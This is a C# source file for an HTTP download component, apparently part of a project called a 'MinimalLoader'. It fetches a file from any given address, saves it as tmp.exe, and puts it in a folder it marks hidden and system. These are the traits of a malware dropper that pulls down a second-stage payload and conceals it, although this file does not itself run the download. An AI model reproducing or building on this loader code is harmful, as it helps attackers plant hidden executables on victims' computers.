using Krypton.Support;
using System;
using System.IO;
using System.Net;

namespace Krypton.MinimalLoader.Core.Http
{
	public delegate void DownloadCompleteDelegate(System.ComponentModel.AsyncCompletedEventArgs e);
	public delegate void DownloadChangedDelegate(DownloadProgressChangedEventArgs e);
	public class HttpComponent : KryptonComponent<HttpComponent>
	{
		private event DownloadCompleteDelegate OnDownloadComplete;
		private event DownloadChangedDelegate OnDownloadChanged;

		private WebClient Web;

		public HttpComponent()
		{
			Web = new WebClient();
			Web.DownloadProgressChanged += DownloadProgressChanged;
			Web.DownloadFileCompleted += DownloadFileCompleted;
		}

		public void Reset()
		{
			Web.Dispose();
			Web = null;

			Web = new WebClient();
		}

		public bool Download(string addr, out string file_path)
		{
			Reset();

			try
			{
				if (!Directory.Exists("temporary"))
				{
					var dir = Directory.CreateDirectory("temporary");
					dir.Attributes = FileAttributes.Hidden | FileAttributes.Directory | FileAttributes.System;
				}

				file_path = "temporary\\tmp.exe";

				if (File.Exists(file_path))
				{
					File.Delete(file_path);
				}

				Web.DownloadFile(addr, file_path);
				if (File.Exists(file_path))
				{
					var bytes = File.ReadAllBytes(file_path);
					return bytes.Length > 0;
				}

				return false;
			}
			catch(Exception)
			{
				file_path = "";
				return false;
			}
		}

		public void DownloadAsync(string addr, string file_path)
		{
			Reset();

			Web.DownloadFileAsync(new Uri(addr), file_path);
		}

		private void DownloadFileCompleted(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
		{
			OnDownloadComplete?.Invoke(e);
		}

		private void DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
		{
			OnDownloadChanged?.Invoke(e);
		}
	}
}
